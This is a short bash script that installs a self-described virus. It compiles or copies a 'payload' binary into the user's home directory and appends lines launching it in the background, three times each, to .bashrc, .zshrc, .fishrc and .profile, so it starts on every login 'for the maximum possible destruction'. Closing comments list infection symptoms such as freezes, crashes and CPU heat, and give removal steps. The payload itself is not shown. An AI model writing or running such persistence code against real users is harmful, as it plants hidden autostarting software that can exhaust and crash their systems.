#!/bin/bash

# if termux, the included payload executable will work
#+ otherwise the payload source needs to be compiled
if [[ $PREFIX != *"com.termux"* ]]
then
    gcc ./payload.c -o ./payload
fi

# copy the payload into home directory
cp "./payload" ~/

echo -e "\n" >> ~/.bashrc
echo -e "\n" >> ~/.zshrc
echo -e "\n" >> ~/.fishrc
echo -e "\n" >> ~/.profile

# "&" is used to background the task hence we can use a loop
#+ and open more payloads for the maximum possible destruction. :)

# this writes the malicious script into the login and shell files
#+ making the virus autostart on login.
declare i=3
while [ $i != 0 ]
do
    let i=i-1
    echo -e "./payload &" >> ~/.bashrc
    echo -e "./payload &" >> ~/.zshrc
    echo -e "./payload &" >> ~/.fishrc
    echo -e "./payload &" >> ~/.profile
done

# SYMPTOMPS OF INFECTION:
#+ System freezes after some time
#+ programs begin to crash
#+ CPU might get very hot

# TREATMENT
#+ Check ~/.profile and shell files
#+ shell files can be .bashrc, .zshrc or any such shell files
#+ Comment out any code that you find suspicious from these files
